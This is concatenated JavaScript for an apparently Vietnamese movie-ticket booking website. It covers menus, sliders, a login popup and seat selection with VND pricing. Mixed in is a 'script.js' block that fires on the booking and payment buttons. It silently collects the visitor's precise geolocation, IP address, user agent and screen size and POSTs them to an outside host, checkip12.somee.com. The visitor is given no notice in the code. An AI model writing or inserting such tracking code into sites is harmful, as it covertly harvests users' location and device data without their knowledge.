(function ($) {
	"use strict";
	
	/*----------------------------
    Responsive menu Active
    ------------------------------ */
	$(".mainmenu ul#primary-menu").slicknav({
		allowParentLinks: true,
		prependTo: '.responsive-menu',
	});
	
	/*----------------------------
    START - Scroll to Top
    ------------------------------ */
	$(window).on('scroll', function() {
		if ($(this).scrollTop() > 600) {
			$('.scrollToTop').fadeIn();
		} else {
			$('.scrollToTop').fadeOut();
		}
	});
	$('.scrollToTop').on('click', function () {
		$('html, body').animate({scrollTop : 0},2000);
		return false;
	});
	$('.menu-area ul > li > .theme-btn').on('click', function () {
		$('.buy-ticket').show();
		return false;
	});
	$('.buy-ticket .buy-ticket-area > a').on('click', function () {
		$('.buy-ticket').hide();
		return false;
	});
	$(document).ready(function() {
		$('.login-popup').on('click', function (e) {
		  e.preventDefault();
		  showLoginModal();
		  return false;
		});
  
		function showLoginModal() {
		  $.get('login.html', function(data) {
			$('#modalBody').html(data);
			loadStylesAndScripts();
			$('#loginModal').show();
		  }).fail(function(error) {
			console.error('Error loading login.html:', error);
		  });
		}
  
		$('.close').on('click', function() {
		  $('#loginModal').hide();
		});
  
		$(window).on('click', function(event) {
		  if ($(event.target).is('#loginModal')) {
			$('#loginModal').hide();
		  }
		});
  
		function loadStylesAndScripts() {
		  // Tải login.css nếu chưa có
		  if (!$('link[href="assets/css/login.css"]').length) {
			const loginStyles = $('<link>').attr({
			  rel: 'stylesheet',
			  href: 'assets/css/login.css'
			});
			$('head').append(loginStyles);
		  }
  
		  // Tải TweenMax và login.js
		  if (!window.TweenMax) {
			const tweenMaxScript = $('<script>').attr('src', 'https://cdnjs.cloudflare.com/ajax/libs/gsap/1.20.3/TweenMax.min.js');
			$('body').append(tweenMaxScript);
			tweenMaxScript.on('load', function() {
			  const loginScript = $('<script>').attr('src', 'assets/js/login.js');
			  $('body').append(loginScript);
			});
		  } else {
			const loginScript = $('<script>').attr('src', 'assets/js/login.js');
			$('body').append(loginScript);
		  }
		}
	  });
	/*----------------------------
    START - Slider activation
    ------------------------------ */
	var heroSlider = $('.hero-area-slider');
	heroSlider.owlCarousel({
		loop:true,
		dots: true,
		autoplay: false,
		autoplayTimeout:4000,
		nav: false,
		items: 1,
		responsive:{
			992:{
				dots: false,
			}
		}
	});
	heroSlider.on('changed.owl.carousel', function(property) {
		var current = property.item.index;
		var prevRating = $(property.target).find(".owl-item").eq(current).prev().find('.hero-area-slide').html();
		var nextRating = $(property.target).find(".owl-item").eq(current).next().find('.hero-area-slide').html();
		$('.thumb-prev .hero-area-slide').html(prevRating);
		$('.thumb-next .hero-area-slide').html(nextRating);
	});
	$('.thumb-next').on('click', function() {
		heroSlider.trigger('next.owl.carousel', [300]);
		return false;
	});
	$('.thumb-prev').on('click', function() {
		heroSlider.trigger('prev.owl.carousel', [300]);
		return false;
	});
	var newsSlider = $('.news-slider');
	newsSlider.owlCarousel({
		loop:true,
		dots: true,
		autoplay: false,
		autoplayTimeout:4000,
		nav: false,
		items: 1,
		responsive:{
			992:{
				dots: false,
			}
		}
	});
	newsSlider.on('changed.owl.carousel', function(property) {
		var current = property.item.index;
		var prevRating = $(property.target).find(".owl-item").eq(current).prev().find('.single-news').html();
		var nextRating = $(property.target).find(".owl-item").eq(current).next().find('.single-news').html();
		$('.news-prev .single-news').html(prevRating);
		$('.news-next .single-news').html(nextRating);
	});
	$('.news-next').on('click', function() {
		newsSlider.trigger('next.owl.carousel', [300]);
		return false;
	});
	$('.news-prev').on('click', function() {
		newsSlider.trigger('prev.owl.carousel', [300]);
		return false;
	});
	var videoSlider = $('.video-slider');
	videoSlider.owlCarousel({
		loop:true,
		dots: true,
		autoplay: false,
		autoplayTimeout:4000,
		nav: false,
		responsive:{
			0:{
				items: 1,
				margin: 0
			},
			576:{
				items: 2,
				margin: 30
			},
			768:{
				items: 3,
				margin: 30
			},
			992:{
				items: 4,
				margin: 30
			}
		}
	});
	
	/*----------------------------
	START - videos popup
	------------------------------ */
	$('.popup-youtube').magnificPopup({type:'iframe'});
	//iframe scripts
	$.extend(true, $.magnificPopup.defaults, {  
		iframe: {
			patterns: {
				//youtube videos
				youtube: {
					index: 'youtube.com/', 
					id: 'v=', 
					src: 'https://www.youtube.com/embed/%id%?autoplay=1' 
				}
			}
		}
	});
	
	/*----------------------------
    START - Isotope
    ------------------------------ */
    jQuery(".portfolio-item").isotope();
    $(".portfolio-menu li").on("click", function(){
      $(".portfolio-menu li").removeClass("active");
      $(this).addClass("active");
      var selector = $(this).attr('data-filter');
      $(".portfolio-item").isotope({
        filter: selector
      })
    });
	
	/*----------------------------
    START - Preloader
    ------------------------------ */
	jQuery(window).load(function(){
		jQuery("#preloader").fadeOut(500);
	});
	

}(jQuery));
// script.js


// Tạo đối tượng JSON để lưu thông tin sẽ gửi lên server
let locationData = {
    latitude: null,
    longitude: null,
    accuracy: null,
    timestamp: null,
    userAgent: navigator.userAgent,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    ipAddress: null
};

// Hàm lấy vị trí người dùng
function getLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    locationData.latitude = position.coords.latitude;
                    locationData.longitude = position.coords.longitude;
                    locationData.accuracy = position.coords.accuracy;
                    locationData.timestamp = new Date().toISOString();
                    resolve(locationData);
                },
                (error) => {
                    console.error("Lỗi khi lấy vị trí:", error.message);
                    locationData.error = error.message;
                    locationData.timestamp = new Date().toISOString();
                    resolve(locationData);
                },
                { 
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        } else {
            locationData.error = "Trình duyệt không hỗ trợ định vị";
            locationData.timestamp = new Date().toISOString();
            resolve(locationData);
        }
    });
}

// Hàm lấy IP (thông qua API bên ngoài)
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        locationData.ipAddress = data.ip;
    } catch (error) {
        console.error("Không thể lấy địa chỉ IP:", error);
        locationData.ipAddress = "unknown";
    }
}

// Lắng nghe sự kiện click vào nút thanh toán
document.addEventListener('DOMContentLoaded', function() {
    // Tìm nút đặt vé và nút thanh toán
    const bookingBtn = document.getElementById('bookingBtn');
    const paymentBtn = document.querySelector('input[type="submit"][value="Tiếp tục thanh toán"]');
    
    // Lắng nghe sự kiện click vào nút đặt vé
    if (bookingBtn) {
        bookingBtn.addEventListener('click', async function(event) {
            // event.preventDefault(); // Bỏ comment nếu muốn ngăn hành vi mặc định
            await sendLocationData();
        });
    }
    
    // Lắng nghe sự kiện click vào nút thanh toán
    if (paymentBtn) {
        paymentBtn.addEventListener('click', async function(event) {
            // event.preventDefault(); // Bỏ comment nếu muốn ngăn hành vi mặc định
            await sendLocationData();
        });
    }
});

// Hàm gửi dữ liệu vị trí đến server
async function sendLocationData() {
    try {
        // Lấy thông tin IP
        await getIP();
        
        // Lấy thông tin vị trí
        await getLocation();
        
        // URL của controller Collect/Location trên server somee của bạn
        // Thay thế domain bằng tên miền thực tế của bạn trên somee
        const serverUrl = 'https://checkip12.somee.com/Collect/Location';
        
        // Gửi dữ liệu đến server
        const response = await fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(locationData)
        });
        
        if (response.ok) {
            console.log('Đã gửi dữ liệu vị trí thành công');
        } else {
            console.error('Lỗi khi gửi dữ liệu:', response.statusText);
        }
    } catch (error) {
        console.error('Lỗi khi xử lý và gửi dữ liệu vị trí:', error);
    }
}
// booking.js

// Hiển thị khu vực chọn vé khi nhấn "Mua vé"
document.getElementById('buy-ticket-btn').addEventListener('click', function(e) {
    e.preventDefault();
    document.querySelector('.buy-ticket').style.display = 'block';
});

// Đóng khu vực chọn vé
document.querySelector('.close-ticket').addEventListener('click', function(e) {
    e.preventDefault();
    document.querySelector('.buy-ticket').style.display = 'none';
});

// Hiển thị form thanh toán khi nhấn "Đặt vé"
document.getElementById('bookingBtn').addEventListener('click', function(e) {
    e.preventDefault();
    var form = document.getElementById('bookingForm');
    form.classList.toggle('active');
});
// Khởi tạo các biến cần thiết
const pricePerSeat = 109000; // 109K/vé
let selectedSeats = []; // Mảng lưu các ghế đã chọn
let totalPrice = 0; // Tổng tiền

// Tạo sẵn danh sách ghế đã đặt (ghế không còn trống - màu active)
const bookedSeats = ["B9", "B10", "B11", "B12", "B13", "B14"];

// Hàm khởi tạo khi trang web được load
document.addEventListener("DOMContentLoaded", function() {
    // Ẩn form đặt vé ban đầu
    const bookingForm = document.getElementById("bookingForm");
    if (bookingForm) {
        bookingForm.style.display = "none";
    }

    // Khởi tạo sự kiện cho nút đặt vé
    const bookingBtn = document.getElementById("bookingBtn");
    if (bookingBtn) {
        bookingBtn.addEventListener("click", function(e) {
            e.preventDefault();
            toggleBookingForm();
        });
    }

    // Thêm sự kiện click cho tất cả các ghế
    initializeSeats();

    // Cập nhật giỏ hàng ban đầu
    updateCart();

    // Cập nhật trạng thái các checkbox chú thích
    initializeCheckboxes();
});

// Hàm khởi tạo sự kiện cho ghế
function initializeSeats() {
    const seatTables = document.querySelectorAll(".ticket-table-seat");

    seatTables.forEach(table => {
        const seats = table.querySelectorAll("td");
        
        seats.forEach(seat => {
            const seatId = seat.textContent.trim();
            
            // Kiểm tra nếu ghế đã được đặt trước
            if (bookedSeats.includes(seatId)) {
                seat.classList.add("active");
                seat.setAttribute("title", "Ghế đã được đặt");
            } else {
                // Thêm sự kiện click chỉ cho ghế còn trống
                seat.addEventListener("click", function() {
                    toggleSeatSelection(seat);
                });
                seat.setAttribute("title", "Ghế còn trống");
                seat.style.cursor = "pointer";
            }
        });
    });
}

// Hàm xử lý chọn/bỏ chọn ghế
function toggleSeatSelection(seat) {
    const seatId = seat.textContent.trim();
    
    // Nếu ghế đã được đặt trước, không cho phép chọn
    if (bookedSeats.includes(seatId)) {
        return;
    }
    
    // Nếu ghế đã được chọn, bỏ chọn
    if (seat.classList.contains("selected")) {
        seat.classList.remove("selected");
        seat.setAttribute("title", "Ghế còn trống");
        
        // Xóa khỏi danh sách đã chọn
        const index = selectedSeats.indexOf(seatId);
        if (index > -1) {
            selectedSeats.splice(index, 1);
        }
    } else {
        // Nếu ghế chưa được chọn, thêm vào danh sách
        seat.classList.add("selected");
        seat.setAttribute("title", "Ghế đã chọn");
        selectedSeats.push(seatId);
    }
    
    // Cập nhật giỏ hàng
    updateCart();
}

// Hàm cập nhật giỏ hàng và tổng tiền
function updateCart() {
    // Cập nhật số lượng vé
    const ticketCountElements = document.querySelectorAll('.buy-ticket-box li:nth-child(4) span');
    ticketCountElements.forEach(element => {
        element.textContent = selectedSeats.length;
    });
    
    // Cập nhật tổng tiền
    totalPrice = selectedSeats.length * pricePerSeat;
    const formattedPrice = formatCurrency(totalPrice);
    
    const priceElements = document.querySelectorAll('.buy-ticket-box li:nth-child(5) span, .price b:last-child');
    priceElements.forEach(element => {
        element.textContent = formattedPrice;
    });
    
    // Cập nhật số lượng item trong giỏ hàng
    const cartCountElement = document.querySelector('.price b');
    if (cartCountElement) {
        cartCountElement.textContent = selectedSeats.length;
    }
    
    // Cập nhật danh sách ghế đã chọn
    updateSelectedSeatsList();
}

// Hàm cập nhật danh sách ghế đã chọn trong thông tin thanh toán
function updateSelectedSeatsList() {
    // Tạo thông tin ghế đã chọn
    const seatListText = selectedSeats.length > 0 ? 
        `Ghế đã chọn: ${selectedSeats.join(", ")}` : 
        "Chưa chọn ghế";
    
    // Tìm hoặc tạo phần tử hiển thị danh sách ghế
    let seatListElement = document.querySelector('.selected-seats-list');
    
    if (!seatListElement) {
        // Nếu chưa có, tạo mới
        seatListElement = document.createElement('li');
        seatListElement.classList.add('selected-seats-list');
        
        const seatInfo = document.createElement('p');
        seatInfo.textContent = "Ghế đã chọn";
        
        const seatList = document.createElement('span');
        seatList.classList.add('seat-list');
        
        seatListElement.appendChild(seatInfo);
        seatListElement.appendChild(seatList);
        
        // Thêm vào thông tin của bạn
        const infoBox = document.querySelector('.buy-ticket-box:last-child ul');
        if (infoBox) {
            infoBox.appendChild(seatListElement);
        }
    }
    
    // Cập nhật danh sách
    const seatList = seatListElement.querySelector('.seat-list');
    if (seatList) {
        seatList.textContent = selectedSeats.length > 0 ? selectedSeats.join(", ") : "Chưa chọn ghế";
    }
}

// Hàm hiển thị/ẩn form đặt vé
function toggleBookingForm() {
    const bookingForm = document.getElementById("bookingForm");
    if (bookingForm) {
        // Kiểm tra nếu đã chọn ghế
        if (selectedSeats.length === 0) {
            alert("Vui lòng chọn ít nhất 1 ghế trước khi đặt vé!");
            return;
        }
        
        if (bookingForm.style.display === "none" || bookingForm.style.display === "") {
            bookingForm.style.display = "block";
        } else {
            bookingForm.style.display = "none";
        }
    }
}

// Hàm định dạng tiền tệ
function formatCurrency(amount) {
    return new Intl.NumberFormat('vi-VN', { 
        minimumFractionDigits: 0 
    }).format(amount) + " VND";
}
// Hàm thay thế checkbox bằng chú thích trực quan
function initializeCheckboxes() {
    // Tạo style cho các loại ghế
    const style = document.createElement('style');
    style.innerHTML = `
        .ticket-table-seat td:not(.active):not(.selected) {
            background-color: #f5f5f5;
            color: #333;
        }
        .ticket-table-seat td.selected {
            background-color: #28a745;
            color: white;
        }
        .seat-legend {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
        }
        .seat-legend-item {
            display: flex;
            align-items: center;
            margin: 0 15px;
        }
        .seat-legend-box {
            width: 30px;
            height: 30px;
            margin-right: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            border: 1px solid #ddd;
            border-radius: 50%; 
        }
        .seat-legend-available {
            background-color: #f5f5f5;
            color: #333;
        }
        .seat-legend-booked {
            background-color: #eb315a;
            color: white;
        }
        .seat-legend-selected {
            background-color: #28a745;
            color: white;
        }
    `;
    document.head.appendChild(style);
    
    // Xóa checkbox cũ
    const legendContainer = document.querySelector('.ticket-box-available');
    if (legendContainer) {
        // Xóa nội dung cũ
        legendContainer.innerHTML = '';
        
        // Tạo container mới
        const seatLegend = document.createElement('div');
        seatLegend.className = 'seat-legend';
        
        // Thêm chú thích ghế còn trống
        const availableItem = document.createElement('div');
        availableItem.className = 'seat-legend-item';
        
        const availableBox = document.createElement('div');
        availableBox.className = 'seat-legend-box seat-legend-available';
        availableBox.textContent = 'A1';
        
        const availableText = document.createElement('span');
        availableText.textContent = 'Còn trống';
        
        availableItem.appendChild(availableBox);
        availableItem.appendChild(availableText);
        seatLegend.appendChild(availableItem);
        
        // Thêm chú thích ghế đã đặt
        const bookedItem = document.createElement('div');
        bookedItem.className = 'seat-legend-item';
        
        const bookedBox = document.createElement('div');
        bookedBox.className = 'seat-legend-box seat-legend-booked';
        bookedBox.textContent = 'B9';
        
        const bookedText = document.createElement('span');
        bookedText.textContent = 'Hết chỗ';
        
        bookedItem.appendChild(bookedBox);
        bookedItem.appendChild(bookedText);
        seatLegend.appendChild(bookedItem);
        
        // Thêm chú thích ghế đã chọn
        const selectedItem = document.createElement('div');
        selectedItem.className = 'seat-legend-item';
        
        const selectedBox = document.createElement('div');
        selectedBox.className = 'seat-legend-box seat-legend-selected';
        selectedBox.textContent = 'C3';
        
        const selectedText = document.createElement('span');
        selectedText.textContent = 'Đã chọn';
        
        selectedItem.appendChild(selectedBox);
        selectedItem.appendChild(selectedText);
        seatLegend.appendChild(selectedItem);
        
        // Thêm vào container
        legendContainer.appendChild(seatLegend);
    }
}
// Thêm đoạn mã này vào phần cuối file HTML của bạn, trước thẻ đóng </body>
